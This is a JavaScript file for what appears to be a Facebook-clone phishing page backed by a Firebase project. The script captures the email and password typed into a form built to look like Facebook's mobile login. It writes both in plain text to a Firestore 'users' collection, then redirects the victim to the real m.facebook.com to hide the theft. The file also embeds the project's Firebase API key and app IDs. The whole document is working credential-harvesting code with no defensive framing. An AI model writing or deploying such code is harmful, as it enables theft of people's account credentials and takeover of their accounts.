// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBHIl51vQ1ApNyRpx0ldhpzooEwfGlsQBg",
  authDomain: "fb-clone-tariq.firebaseapp.com",
  projectId: "fb-clone-tariq",
  storageBucket: "fb-clone-tariq.appspot.com",
  messagingSenderId: "688648477444",
  appId: "1:688648477444:web:fa14981be262468bf10e51",
};
console.log("Initializing Firebase...");
firebase.initializeApp(firebaseConfig);

// Initialize Firestore
const db = firebase.firestore();
console.log("Firebase and Firestore initialized.");

document.addEventListener("DOMContentLoaded", function () {
  console.log("DOM fully loaded and parsed");

  // Get the form element
  const form = document.getElementById("login_form");
  console.log("Form element found:", form);

  // Attach an event listener to the form for the submit event
  form.addEventListener("submit", function (event) {
    console.log("Form submission detected");

    // Prevent the default form submission
    event.preventDefault();

    // Get values from form fields
    const email = document.getElementById("m_login_email").value;
    const password = document.getElementById("m_login_password").value;
    console.log(
      "Email and password obtained from form:",
      email,
      "[password hidden]"
    );

    // Call the function to send data to Firebase
    sendDataToFirestore(email, password);
  });
});

function sendDataToFirestore(email, password) {
  console.log("Sending data to Firestore...");

  // Prepare the data to send
  const data = {
    email: email,
    // Warning: Storing passwords in plain text is a security risk
    password: password,
  };

  // Add a new document in collection "users"
  db.collection("users")
    .add(data)
    .then((docRef) => {
      console.log("Document written with ID: ", docRef.id);
      // Handle success scenario, e.g., redirecting to another page or showing a success message
      // Redirect user to a specific URL
      window.location.href = "https://m.facebook.com"; // Change to your desired URL
    })
    .catch((error) => {
      console.error("Error adding document: ", error);
      // Handle failure scenario, e.g., showing an error message to the user
    });
}
